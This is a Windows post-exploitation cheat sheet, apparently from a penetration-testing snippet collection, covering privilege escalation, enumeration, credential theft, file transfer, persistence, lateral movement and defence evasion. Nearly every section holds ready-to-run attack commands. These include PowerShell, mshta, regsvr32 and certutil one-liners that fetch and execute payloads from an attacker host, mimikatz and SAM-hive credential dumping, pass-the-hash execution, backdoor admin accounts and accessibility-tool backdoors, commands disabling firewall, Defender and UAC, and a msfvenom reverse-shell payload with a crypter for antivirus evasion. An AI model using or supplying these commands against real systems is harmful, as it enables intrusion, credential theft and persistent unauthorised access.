██ Privilege escalation

    ▒▒ Ideas

        - Access to sensitive files such as the Windows SAM file
        - Always Install Elevated
        - Autologon User Credential
        - DLL Hijacking by overwriting poorly secured DLLs
        - DLL Injection
        - Group Policy Preferences
        - Insecure File/Folder Permissions
        - Insecure Named Pipes Permissions
        - Insecure Registry Permissions
        - Insecure Service Permissions
        - Installation scripts and data containing passwords
        - Registry settings such as always elevated and automatically executed binaries
        - Scheduled tasks that execute scripts and programs
        - Stored Credentials
        - Token Manipulation
        - Unattended Answer File
        - Unquoted Service Path
        - User Account Control (UAC) Bypass
        - Vulnerable software running with high privileges
        - Windows Kernel Exploit

    ▒▒ Powershell

        ~> powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://VAR_ATTACKER_HOST/PowerUp.ps1'); Invoke-AllChecks"

    ▒▒ mimikatz

        ~> mimikatz "privilege::debug" "sekurlsa::logonPasswords" exit
        ~> mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" exit
        ~> mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "lsadump::lsa" "lsadump::trust" exit
        ~> mimikatz "privilege::debug" "token::elevate /domainadmin" exit
        token::run cmd.exe
        sekurlsa::pth /user:VAR_USERNAME /domain:VAR_DOMAIN /ntlm:VAR_HASH /run:cmd

    ▒▒ At

        ~> at 16:00 /interactive cmd

    ▒▒ Services

        ~> sc qc upnphost
        ~> sc config upnphost binpath= "net user VAR_USERNAME VAR_PASSWORD /add && net localgroup Administrators VAR_USERNAME /add" type= interact
        ~> sc config upnphost obj= ".\LocalSystem" password=""
        ~> net stop upnphost
        ~> net start upnphost

██ Enumeration

    ▒▒ Basic

        ░░ Version

            ~> echo %USERNAME% || whoami
            ~> whoami /all
            ~> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
            ~> wmic useraccount where name='%USERNAME%' get sid
            ~> wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

            ~> reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
            ~> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential
            ~> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"

            ~> net config workstation
            ~> net config server

            ~> wmic startup list brief
            ~> wmic share list

            # Windows XP
            C:\Windows\System32\eula.txt

            # Windows 7
            C:\Windows\System32\license.rtf

            # Windows 10
            C:\Windows\System32\license.rtf (EULA code lookup)

        ░░ Users and groups

            ~> net users
            ~> net localgroup Administrators
            ~> net localgroup "Remote Desktop Users"
            ~> wmic useraccount list full
            ~> net session
            ~> net accounts /domain

        ░░ Windows Server (RDP)

            ~> qwinsta
            ~> quser

        ░░ Processes

            ~> tasklist -v
            ~> tasklist /svc
            ~> tasklist /v /fi "username eq system"
            ~> wmic process list
            ~PS> Get-Process ^| Get-Member

        ░░ Services

            ~> sc query state= all | findstr "SERVICE_NAME DISPLAY_NAME STATE"
            ~> wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """

        ░░ Antivirus

            ~> wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get DisplayName /format:list

        ░░ Unquoted Service Paths

            ~> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

        ░░ Scheduled

            ~> schtasks /query /fo LIST /v
            ~> schtasks /query /fo LIST 2>nul | findstr "TaskName"
            ~> schtasks /query /fo LIST /v | findstr "TaskName Author: Run: User:"

        ░░ Networking

            ~> ipconfig /all
            ~> route print
            ~> arp -a
            ~> netstat -ano
            ~> netstat -an | find /i "established"

            ~> netsh firewall show state
            ~> netsh firewall show config

            ~> net share
            ~> net use
            ~> net view
            ~> net view /domain

        ░░ Missing patches

            ~> wmic qfe get Caption,Description,HotFixID,InstalledOn
            ~> IEX (New-Object Net.WebClient).DownloadString("http://VAR_ATTACKER_HOST/Sherlock.ps1"); | powershell -noprofile -

         ░░ Weak permissions

            ~> icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
            ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
            ~> icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
            ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
            ~> icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
            ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone"
            ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone"
            ~> icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone"
            ~> icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
            ~> icacls "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"
            ~> icacls "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\Users"

         ░░ Interesting files

            %SYSTEMROOT%\Panther\Unattend.xml
            %SYSTEMROOT%\Panther\Unattend\Unattend.xml
            %SYSTEMROOT%\system32\sysprep.inf
            %SYSTEMROOT%\system32\sysprep\sysprep.xml
            %SYSTEMROOT%\ntds
            %SYSTEMROOT%\System32\GroupPolicy\Machine
            %SYSTEMROOT%\System32\GroupPolicy\User
            %SYSTEMROOT%\System32\GroupPolicyUsers
            %SYSTEMDRIVE%\pagefile.sys
            %SYSTEMROOT%\debug\NetSetup.log
            %SYSTEMROOT%\iis6.log
            %SYSTEMROOT%\iis7.log
            %SYSTEMROOT%\iis8.log
            %SYSTEMROOT%\Panther\Unattend.txt
            %SYSTEMROOT%\Panther\Unattend\Unattended.xml
            %SYSTEMROOT%\Panther\Unattended.xml
            %SYSTEMROOT%\php.ini
            %SYSTEMROOT%\repair\SAM
            %SYSTEMROOT%\repair\security
            %SYSTEMROOT%\repair\software
            %SYSTEMROOT%\repair\system
            %SYSTEMROOT%\system32\CCM\logs\*.log
            %SYSTEMROOT%\system32\config\AppEvent.Evt
            %SYSTEMROOT%\system32\config\default.sav
            %SYSTEMROOT%\system32\config\regback\default
            %SYSTEMROOT%\System32\config\RegBack\SAM
            %SYSTEMROOT%\System32\config\RegBack\system
            %SYSTEMROOT%\system32\config\regback\security
            %SYSTEMROOT%\system32\config\regback\software
            %SYSTEMROOT%\System32\config\SAM
            %SYSTEMROOT%\system32\config\SecEvent.Evt
            %SYSTEMROOT%\system32\config\security.sav
            %SYSTEMROOT%\system32\config\software.sav
            %SYSTEMROOT%\System32\config\SYSTEM
            %SYSTEMROOT%\system32\config\system.sav
            %SYSTEMROOT%\System32\drivers\etc\hosts
            %SYSTEMROOT%\System32\drivers\etc\networks
            %SYSTEMROOT%\system32\inetsrv\config\applicationHost.config
            %SYSTEMROOT%\system32\inetsrv\config\schema\ASPNET_schema.xml
            %SYSTEMROOT%\system32\logfiles\httperr\httperr1.log
            %SYSTEMROOT%\system32\sysprep
            %SYSTEMROOT%\win.ini
            %SYSTEMROOT%\windowsupdate.log
            %USERPROFILE%\ntuser.dat
            %USERPROFILE%\Application Data\Microsoft\Credentials\
            %SYSTEMDRIVE%\apache\logs\access.log
            %SYSTEMDRIVE%\apache\logs\error.log
            %SYSTEMDRIVE%\apache\php\php.ini
            %SYSTEMDRIVE%\Autounattend.xml
            %SYSTEMDRIVE%\boot.ini
            %SYSTEMDRIVE%\Documents and Settings\Administrator\desktop\desktop.ini
            %SYSTEMDRIVE%\Documents and Settings\Administrator\NTUser.dat
            %SYSTEMDRIVE%\Documents and Settings\Administrator\ntuser.ini
            %SYSTEMDRIVE%\inetpub\logs\LogFiles\
            %SYSTEMDRIVE%\inetpub\wwwroot\
            %SYSTEMDRIVE%\inetpub\wwwroot\global.asa
            %SYSTEMDRIVE%\inetpub\wwwroot\web.config
            %SYSTEMDRIVE%\MySQL\data\hostname.err
            %SYSTEMDRIVE%\MySQL\data\mysql.err
            %SYSTEMDRIVE%\MySQL\data\mysql.log
            %SYSTEMDRIVE%\MySQL\my.cnf
            %SYSTEMDRIVE%\MySQL\my.ini
            %SYSTEMDRIVE%\php4\php.ini
            %SYSTEMDRIVE%\php5\php.ini
            %SYSTEMDRIVE%\php\php.ini
            %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
            %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\access.log
            %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\error.log
            %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
            %SYSTEMDRIVE%\Program Files (x86)\FileZilla Server\FileZilla Server.xml
            %SYSTEMDRIVE%\Program Files (x86)\xampp\apache\conf\httpd.conf
            %SYSTEMDRIVE%\Program Files\Apache Group\Apache2\conf\httpd.conf
            %SYSTEMDRIVE%\Program Files\Apache Group\Apache\conf\httpd.conf
            %SYSTEMDRIVE%\Program Files\Apache Group\Apache\logs\access.log
            %SYSTEMDRIVE%\Program Files\Apache Group\Apache\logs\error.log
            %SYSTEMDRIVE%\Program Files\FileZilla Server\FileZilla Server.xml
            %SYSTEMDRIVE%\Program Files\MySQL\data\hostname.err
            %SYSTEMDRIVE%\Program Files\MySQL\data\mysql-bin.log
            %SYSTEMDRIVE%\Program Files\MySQL\data\mysql.err
            %SYSTEMDRIVE%\Program Files\MySQL\data\mysql.log
            %SYSTEMDRIVE%\Program Files\MySQL\my.cnf
            %SYSTEMDRIVE%\Program Files\MySQL\my.ini
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\hostname.err
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql-bin.log
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql.err
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql.log
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\my.cnf
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\my.ini
            %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.1\my.ini
            %SYSTEMDRIVE%\sysprep.inf
            %SYSTEMDRIVE%\sysprep\sysprep.inf
            %SYSTEMDRIVE%\sysprep\sysprep.xml
            %SYSTEMDRIVE%\Unattend.xml
            %SYSTEMDRIVE%\Users\Administrator\Desktop\desktop.ini
            %SYSTEMDRIVE%\Users\Administrator\NTUser.dat
            %SYSTEMDRIVE%\Users\Administrator\NTUser.ini
            %SYSTEMDRIVE%\xampp\apache\bin\php.ini
            %SYSTEMDRIVE%\xampp\apache\conf\httpd.conf
            %SYSTEMDRIVE%\xampp\apache\logs\access.log
            %SYSTEMDRIVE%\xampp\apache\logs\error.log
            %SYSTEMDRIVE%\xampp\security\webdav.htpasswd
            %SYSTEMDRIVE%\xampp\tomcat\conf\tomcat-users.xml
            %SYSTEMDRIVE%\xampp\tomcat\conf\web.xml
            %SYSTEMDRIVE%\xampp\webalizer\webalizer.conf
            %SYSTEMDRIVE%\xampp\webdav\webdav.txt

    ▒▒ Passwords

        ░░ Registry

            ~> reg save HKLM\SYSTEM %TEMP%\SYSTEM.bak
            ~> reg save HKLM\SAM %TEMP%\SAM.bak
            ~> reg save HKLM\SECURITY %TEMP%\SECURITY.bak

            ~> reg query HKLM /f password /t REG_SZ /s
            ~> reg query HKCU /f password /t REG_SZ /s

        ░░ Windows Server 2007

            C:\Windows\System32\config\SAM
            C:\Windows\System32\config\SYSTEM
            C:\Windows\System32\config\RegBack\SAM
            C:\Windows\System32\config\RegBack\SAM.OLD
            C:\Windows\System32\config\RegBack\SYSTEM
            C:\Windows\System32\config\RegBack\SYSTEM.OLD

        ░░ Windows XP

            C:\Windows\repair\SAM
            C:\Windows\repair\SECURITY
            C:\Windows\repair\system

        ░░ Other locations

            ~> dir %SYSTEMROOT%\repair\SAM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\SAM 2>nul
            ~> dir %SYSTEMROOT%\repair\system 2>nul
            ~> dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
            ~> dir /a /b /s SAM.b*

        ░░ Tools

            ~> wce32.exe -w
            ~> /usr/share/windows-binaries/fgdump/pwdump.exe
            ~> /usr/share/windows-binaries/fgdump/fgdump.exe
            ~> powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://VAR_ATTACKER_HOST/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
            ~> powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://VAR_ATTACKER_HOST/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCerts"

            ~$ samdump2 system sam > hashes.txt

        ░░ Stored credentials (DPAPI)

            C:\Users\security\AppData\Roaming\Microsoft\Credentials\

            ~$ python /opt/impacket/examples/dpapi.py credential -file credentials

    ▒▒ Extended

        ░░ Automated

            ~> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

        ░░ Sensitive data

            ~> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* 2>nul
            ~> cd C:\ && findstr /SI /M password *.xml *.ini *.txt *.config *.cfg 2>nul
            ~PS> Get-Childitem –Path C:\Users\ -Include *pass*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
            ~PS> Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
            ~> dir "C:\Documents and Settings\" /a /b /s

        ░░ SNMP

            ~> reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
            ~PS> Get-ChildItem -–Path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

        ░░ Access for given user

            ~> accesschk.exe VAR_DOMAIN\VAR_USERNAME C:\
            ~> icacls c:\*. /findsid VAR_USERNAME /t /c /l

        ░░ Writable by everyone

            ~PS> Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern "everyone"

        ░░ Weak permissions

            ~> accesschk.exe -uwqs users c:\*.*
            ~> cacls "c:\Program Files" /T | findstr Users

        ░░ World writeable directories and files

            ~> accesschk.exe -uwdqs "Users" c:\ /accepteula
            ~> accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
            ~> accesschk.exe -qwsu "Everyone" * /accepteula
            ~> accesschk.exe -qwsu "Authenticated Users" * /accepteula
            ~> accesschk.exe -qwsu "Users" * /accepteula

        ░░ Services with weak permissions

            ~> accesschk.exe -ucqv VAR_STRING
            ~> accesschk.exe -uwcqv "Authenticated Users" * /accepteula
            ~> accesschk.exe -uwcqv "Everyone" * /accepteula
            ~> accesschk.exe -uwcqv "Users" * /accepteula

        ░░ Services that we can change registry values

            ~> accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
            ~> accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula
            ~> accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula

    ▒▒ GPP

        ░░ sysvol

            ~> findstr /S cpassword \\dc1.DOMAIN\sysvol\*.xml
            ~> ruby gppdecrypt.rb encrypted_output

        ░░ Powershell

            ~PS> Get-GPPPassword

██ File transfer

    ▒▒ certutil

        ~> certutil.exe -urlcache -split -f "http://VAR_ATTACKER_HOST/file.b64" & certutil.exe -f -decode Blob0_0.bin accesschk.exe & del Blob0_0.bin
        ~> certutil.exe -urlcache -split -f "http://VAR_ATTACKER_HOST/file.b64" & certutil.exe -f -decode accesschk.b64 accesschk.exe & del accesschk.b64

    ▒▒ Non-interactive FTP

        ░░ Script

            @ snippets/windows/utils/ftp.bat

    ▒▒ Powershell

        ░░ Script

            @ snippets/windows/utils/wget_ps1.bat

        ░░ CLI

            ~> powershell Invoke-WebRequest -Uri http://VAR_ATTACKER_HOST/nc.exe -OutFile C:\nc.exe
            ~> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://VAR_ATTACKER_HOST/file.exe','C:\Users\user\Desktop\file.exe')"
            ~PS> $h=New-Object -com Msxml2.XMLHTTP;$h.open('GET','http://VAR_ATTACKER_HOST/script.ps1',$false);$h.send();iex $h.responseText
            ~PS> $h=New-Object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://VAR_ATTACKER_HOST/script.ps1',$false);$h.send();iex $h.responseText
            ~PS> $h=New-Object Net.HttpListener;$h.Prefixes.Add("http://+:8000/");$h.Start();While ($h.IsListening){$HC=$h.GetContext();$HRes=$HC.Response;$HRes.Headers.Add("Content-Type","text/plain");$Buf=[Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)));$HRes.ContentLength64=$Buf.Length;$HRes.OutputStream.Write($Buf,0,$Buf.Length);$HRes.Close()};$h.Stop()
            ~PS> $ie=New-Object -com InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://VAR_ATTACKER_HOST/script.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
            ~PS> IEX (iwr 'http://VAR_ATTACKER_HOST/script.ps1')
            ~PS> IEX (New-Object Net.Webclient).downloadstring("http://VAR_ATTACKER_HOST/script.ps1")
            ~PS> Import-Module bitstransfer;Start-BitsTransfer 'http://VAR_ATTACKER_HOST/script.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

        ░░ DNS

            ~PS> IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

        ░░ Base64

            ~$ cat cmd.txt | iconv -t UTF-16LE -f UTF-8 | base64 -w0
            ~> powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc "JABjAGwAaQBlAG4AdAAgA...UAKAApAAoA"

    ▒▒ VBS

        ░░ Script

            @ snippets/windows/utils/wget_vbs.bat

    ▒▒ Powershell listener

        @ snippets/windows/shells/bind/PortListener.ps1

██ Base64 encoder VBS

    @ snippets/windows/utils/base64.vbs

██ Persistence

    ▒▒ Accounts

        ░░ Add

            ~> net user VAR_USERNAME VAR_PASSWORD /add
            ~> net localgroup administrators VAR_USERNAME /add
            ~> net localgroup "Remote Desktop Users" VAR_USERNAME /add

        ░░ useradd.c

            @ snippets/windows/backdoors/useradd.c

    ▒▒ Services

        ░░ Remote

            ~> sc \\VAR_TARGET_HOST create VAR_STRING binpath= "c:\Windows\Temp\foobar.exe"
            ~> sc \\VAR_TARGET_HOST start VAR_STRING
            ~> sc \\VAR_TARGET_HOST delete VAR_STRING

        ░░ Local

            @ snippets/windows/backdoors/service.bat

    ▒▒ Remote Registry

        ░░ Command will run every time a user logs in as the user

            ~> reg add "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING" /t REG_SZ /d "VAR_STRING"

        ░░ Query the remote registry

            ~> reg query "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING"

        ░░ Delete the remote registry

            ~> reg delete "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING"

    ▒▒ Remote Startup

        ░░ Executes every time a user logs in

            ~> xcopy foobar.exe "\\VAR_TARGET_HOST\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"

    ▒▒ Scheduler

        ░░ Create new task and execute it

            ~> schtasks /create /tn VAR_STRING /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S VAR_TARGET_HOST /RU System
            ~> schtasks /run /tn VAR_STRING /S VAR_TARGET_HOST

        ░░ Delete the task after it is executed

            ~> schtasks /F /delete /tn VAR_STRING /S VAR_TARGET_HOST

    ▒▒ RDP

        ~> net start TermService
        ~> netsh add portopening TCP 3389 "Remote Desktop"
        ~> netsh advfirewall set allprofiles state off
        ~> netsh advfirewall show allprofiles
        ~> netsh firewall set opmode disable
        ~> netsh firewall set service remoteadmin enable
        ~> netsh firewall set service type = remotedesktop mode = enable
        ~> sc config TermService start=auto

        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fAllowToGetHelp" /t REG_DWORD /d 0x1 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0x0 /f

    ▒▒ Physical access

        ░░ Replace with cmd.exe

            C:\Windows\System32\sethc.exe

        ░░ Windows 10 (virtual keyboard)

            ~> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f

██ Execution

    ▒▒ WMI

        ░░ Windows

            ~> wmic /node:computername /user:VAR_DOMAIN\VAR_USERNAME path win32_process call create "VAR_STRING"
            ~> wmic /node:@textfile /user:VAR_DOMAIN\VAR_USERNAME path win32_process call create "VAR_STRING"

        ░░ Linux

            ~$ pth-winexe -U VAR_DOMAIN/VAR_HASH //VAR_TARGET_HOST cmd.exe
            ~$ wmiexec.py -hashes VAR_HASH VAR_USERNAME@VAR_TARGET_HOST
            ~$ wmiexec.py -hashes VAR_HASH VAR_DOMAIN/Administrator@VAR_TARGET_HOST "taskkill /f /fi \"USERNAME eq Administrator\""

    ▒▒ RDP

        ~$ xfreerpd /u:VAR_USERNAME /d:VAR_DOMAIN /pth:VAR_HASH /v:VAR_TARGET_HOST

    ▒▒ WinRM

        ░░ Configure the remote machine to work with WinRM

            ~PS> Enable-PSRemoting -Force

        ░░ Testing the WinRM Connection

            ~PS> Test-WSMan VAR_TARGET_HOST

        ░░ Adding Trusted Host in WinRM

            ~> winrm set winrm/config/client @{TrustedHosts="VAR_ATTACKER_HOST"}

        ░░ Execute commands using Powershell Invoke-Command on the target over WinRM

            ~PS> Invoke-Command -ComputerName VAR_TARGET_HOST -ScriptBlock {ipconfig /all}

        ░░ Interactive session

            ~PS> C:\> Enter-PSSession -ComputerName VAR_TARGET_HOST
            ~PS> C:\> Enter-PSSession -ComputerName VAR_TARGET_HOST -credential VAR_DOMAIN\VAR_USERNAME switch

        ░░ Disable Powershell Remoting

            ~PS> C:\Windows\system32> Disable-PSRemoting

    ▒▒ DCOM

        ░░ DCOM applications via MMC Application Class (MMC20.Application)

            ~PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IPAddress"))
            ~PS> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)

        ░░ DCOM via ShellExecute

            ~PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"IPAddress")
            ~PS> $obj = [System.Activator]::CreateInstance($com)
            ~PS> $item = $obj.Item()
            ~PS> $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

        ░░ DCOM via ShellBrowserWindow (Windows 10)

            ~PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
            ~PS> $obj = [System.Activator]::CreateInstance($com)
            ~PS> $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

    ▒▒ Shutdown

        ~> net rpc shutdown -I VAR_TARGET_IP -U VAR_USERNAME%VAR_PASSWORD

    ▒▒ Runas

        @ snippets/windows/utils/runas*

██ Bypassing

    ▒▒ LOLBINs

        ~> cmd.exe /k < \\VAR_ATTACKER_HOST\folder\batchfile.txt
        ~> cscript //E:jscript \\VAR_ATTACKER_HOST\folder\payload.txt
        ~> mshta vbscript:Close(Execute("GetObject(""script:http://VAR_ATTACKER_HOST/payload.sct"")"))
        ~> mshta http://VAR_ATTACKER_HOST/payload.hta
        ~> mshta \\VAR_ATTACKER_HOST\folder\payload.hta
        ~> rundll32.exe \\VAR_ATTACKER_HOST\folder\payload.dll,entrypoint
        ~> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://VAR_ATTACKER_HOST/payload.sct");window.close();
        ~> wmic os get /format:"https://VAR_ATTACKER_HOST/payload.xsl"
        ~> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\VAR_ATTACKER_HOST\folder\payload.dll
        ~> regsvr32 /u /n /s /i:http://VAR_ATTACKER_HOST/payload.sct scrobj.dll
        ~> regsvr32 /u /n /s /i:\\VAR_ATTACKER_HOST\folder\payload.sct scrobj.dll
        ~> odbcconf /s /a {regsvr \\VAR_ATTACKER_HOST\folder\payload_dll.txt}
        ~> cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\VAR_ATTACKER_HOST\folder\payload.xml > payload.xml & !MB! payload.xml"
        ~> certutil -urlcache -split -f http://VAR_ATTACKER_HOST/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

    ▒▒ AlwaysInstallElevated

        ~> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
        ~> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

    ▒▒ Antivirus evasion

        ░░ Invoke-Mimikatz "obfuscation"

            ~$ sed -i -e 's/Invoke-Mimikatz/Invoke-Minidoggiez/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e '/<#/,/#>/c\\' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Minidoggiez.ps1

        ░░ In-memory Mimikatz (use mimidogz instead)

            ~PS> $browser = New-Object System.Net.WebClient
            ~PS> $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
            ~PS> mimi= $browser.DownloadString("http://VAR_ATTACKER_HOST/Invoke-Mimikatz.ps1")
            ~PS> Invoke-Expression(mimi)
            ~PS> Invoke-Mimikatz

        ░░ Hyperion

            ~$ msfvenom -p windows/shell_reverse_tcp lhost=VAR_ATTACKER_HOST lport=VAR_ATTACKER_PORT -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o foobar.exe
            ~$ cp /usr/share/windows-binaries/Hyperion-1.0.zip .
            ~$ unzip Hyperion-1.0.zip
            ~$ cd Hyperion-1.0/
            ~$ Hyperion-1.0# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
            ~$ Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libgcc_s_sjlj-1.dll .
            ~$ Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .
            ~$ Hyperion-1.0# wine hyperion.exe ../foobar.exe ../crypted.exe

    ▒▒ Disable Windows Defender

        ~> sc stop WinDefend

    ▒▒ Disable UAC

        ~> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "FilterAdministratorToken" /t REG_DWORD /d 0x00000000

    ▒▒ Reading files

        ~PS> .\Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\system" -LocalDestination c:\%TEMP\system.bak
        ~PS> .\Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination c:\%TEMP\sam.bak

    ▒▒ JScript Assembly

        [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');$js = 'var js = new ActiveXObject("WScript.Shell");js.Run("calc");'[Microsoft.JScript.Eval]::JScriptEvaluate($js,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());

    ▒▒ XML/XSL

